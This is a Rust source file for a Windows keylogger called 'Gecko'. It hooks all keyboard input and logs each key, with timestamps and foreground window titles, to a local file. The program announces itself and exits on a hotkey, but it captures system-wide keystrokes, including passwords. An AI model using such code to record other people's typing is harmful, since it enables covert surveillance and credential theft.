use std::{collections::HashMap, fs::File, io::Write, process, sync::{mpsc, Arc, Mutex}, thread, time::{Duration, Instant}, path::PathBuf};
use willhook::{keyboard_hook, InputEvent, KeyboardKey};
use winapi::um::winuser::{GetForegroundWindow, GetWindowTextLengthW, GetWindowTextW, VK_CONTROL, VK_SHIFT};
use winapi::um::winuser::GetAsyncKeyState;
use crate::components::{self, filecreator::retrieve_directory, ui};

pub fn activate_keylogger(file: Arc<Mutex<File>>) {
    // Create a channel for keylogger termination
    let (keylogger_sender, keylogger_receiver) = mpsc::channel();
    let (pstatus_sender, pstatus_receiver) = mpsc::channel();
    let held_keys: Arc<Mutex<HashMap<KeyboardKey, Instant>>> = Arc::new(Mutex::new(HashMap::new()));
    let held_keys_clone = Arc::clone(&held_keys);
    let h = keyboard_hook().unwrap();

    println!("Gecko activating....");
    let mut file_guard = file.lock().unwrap();
    writeln!(file_guard, "Gecko activated at: {}", chrono::Local::now().format("%Y-%m-%d %H:%M:%S")).unwrap();
    drop(file_guard);
    let fileex = Arc::clone(&file);

    // Get Keyboard Event Sender channel and Shutdown Sender channel for real-time interpreter
    let (keysender, gsd_rti) = components::rtinterpreter::start_rtinterpreter();
    // Keyboard Event Handling thread
    let keyboard_handle = thread::spawn(move || {
        keyboard_event_handler(keysender, h, held_keys_clone, keylogger_receiver, fileex);
    });
    
    loop {
        if exit_condition() {      
            let pstatus_sender_clone = pstatus_sender.clone(); // Clone pstatus_sender
           
            let _ui = thread::spawn(move || ui::gracefulshutdown::gracefulshutdown(pstatus_sender_clone));
            _ui.join().unwrap();
            if let Ok(_) = pstatus_receiver.try_recv() {
                // Retrieve the directory path
                let dir = match retrieve_directory() {
                    Ok(dir) => dir,
                    Err(err) => {
                        eprintln!("Error retrieving directory path: {}", err);
                        break;
                    }
                };
            
                // Write deactivation timestamp to the log file
                let mut file_guard = file.lock().unwrap();
                writeln!(file_guard, "Gecko deactivated at: {}", chrono::Local::now().format("%Y-%m-%d %H:%M:%S")).unwrap();
                drop(file_guard);
            
                // Send termination signal to the keylogger thread
                if let Err(err) = keylogger_sender.send(()).map_err(|e| format!("Failed to send termination signal to keylogger thread: {}", e)) {
                    eprintln!("{}", err);
                }

                // Send termination signal to the real-time interpreter thread
                if let Err(err) = gsd_rti.send(true).map_err(|e| format!("Failed to send termination signal to real-time interpreter thread: {}", e)) {
                    eprintln!("{}", err);
                }
                std::thread::sleep(Duration::from_millis(100));

                println!("Gecko deactivating....");

                // Open the directory
                if let Err(err) = open_directory(&dir) {
                    eprintln!("Error opening directory: {}", err);
                }
            
                break;
            } else {
                continue;
            }        
        }
        
        std::thread::sleep(Duration::from_millis(10)); // Adjust sleep duration dynamically based on CPU usage
    }

    keyboard_handle.join().unwrap();

    process::exit(0);
}

fn open_directory(directory_path: &PathBuf) -> std::io::Result<()> {
    // Convert PathBuf to &str
    let directory_path_str = directory_path.to_str().ok_or_else(|| {
        std::io::Error::new(std::io::ErrorKind::Other, "Failed to convert directory path to string")
    })?;

    // Rest of your code remains the same
    match std::env::consts::OS {
        "windows" => {
            std::process::Command::new("explorer")
                .arg(directory_path_str)
                .spawn()?;
        }
        "macos" => {
            std::process::Command::new("open")
                .arg("-R")
                .arg(directory_path_str)
                .spawn()?;
        }
        _ => {
            eprintln!("Unsupported OS for opening directory");
        }
    }
    Ok(())
}

fn keyboard_event_handler(keysender: mpsc::Sender<KeyboardKey>, h: willhook::Hook, held_keys: Arc<Mutex<HashMap<KeyboardKey, Instant>>>, receiver: mpsc::Receiver<()>, file: Arc<Mutex<File>>) {
    let mut last_title = String::new();
    loop {
        if let Ok(ie) = h.try_recv() {
            match ie {
                InputEvent::Keyboard(ke) => {
                    if let Some(key) = ke.key {
                        handle_key_event(&keysender, key, ke.pressed, &mut held_keys.lock().unwrap(), &mut last_title, &file);
                    }
                }
                _ => {
                    let mut file_guard = file.lock().unwrap();
                    writeln!(&mut *file_guard, "Unknown Input event: {:?}", ie).unwrap();
                },
            }
        }

        if receiver.try_recv().is_ok() {
            break;
        }

        std::thread::sleep(Duration::from_millis(10)); // Adjust sleep duration dynamically based on CPU usage
    }
}

fn handle_key_event(
    keysender: &mpsc::Sender<KeyboardKey>,
    key: KeyboardKey,
    pressed: willhook::KeyPress,
    held_keys: &mut HashMap<KeyboardKey, Instant>,
    last_title: &mut String,
    file: &Arc<Mutex<File>>,
) {
    let title = active_window();
    match pressed {
        willhook::KeyPress::Down(_) => {
            if !held_keys.contains_key(&key) {
                held_keys.insert(key, Instant::now());
            }
        }
        willhook::KeyPress::Up(_) => {
            if let Some(inittime) = held_keys.remove(&key) {
                    let elapsed = Instant::now().duration_since(inittime);
                    if elapsed.as_millis() < 400 {
                        keysender.send(key).unwrap();
                        log_key(&file, &last_title, key, None);
                    } else {
                        keysender.send(key).unwrap();
                        log_key(&file, &last_title, key, Some(elapsed));
                    }
            }
        }
        _ => {}
    }
    *last_title = title;
}

fn log_key(file: &Arc<Mutex<File>>, title: &str, key: KeyboardKey, elapsed: Option<Duration>) {
    let local_now = chrono::Local::now();
    let local_time_string = local_now.format("%Y-%m-%d %H:%M:%S").to_string();
    let mut file_guard = file.lock().unwrap();
    match elapsed {
        Some(hd) => writeln!(&mut *file_guard, "{} : {} : {:?} : Pressed and held for: {:?}", local_time_string, title, key, hd).unwrap(),
        None => writeln!(&mut *file_guard, "{} : {} : {:?}", local_time_string, title, key).unwrap(),
    };
}

fn active_window() -> String {
    unsafe {
        let active_window = GetForegroundWindow();
        let mut buffer: Vec<u16> = vec![0; 256]; // Allocate a buffer of fixed size
        let len = GetWindowTextLengthW(active_window);
        if len > 0 {
            GetWindowTextW(active_window, buffer.as_mut_ptr(), 256);
            // Convert wide characters to string
            String::from_utf16_lossy(&buffer[..len as usize])
        } else {
            String::new()
        }
    }
}

fn exit_condition() -> bool {
    unsafe {
        GetAsyncKeyState(VK_CONTROL) & 0x8000u16 as i16 != 0
            && GetAsyncKeyState(VK_SHIFT) & 0x8000u16 as i16 != 0
            && GetAsyncKeyState(0x5A) & 0x8000u16 as i16 != 0
    }
}
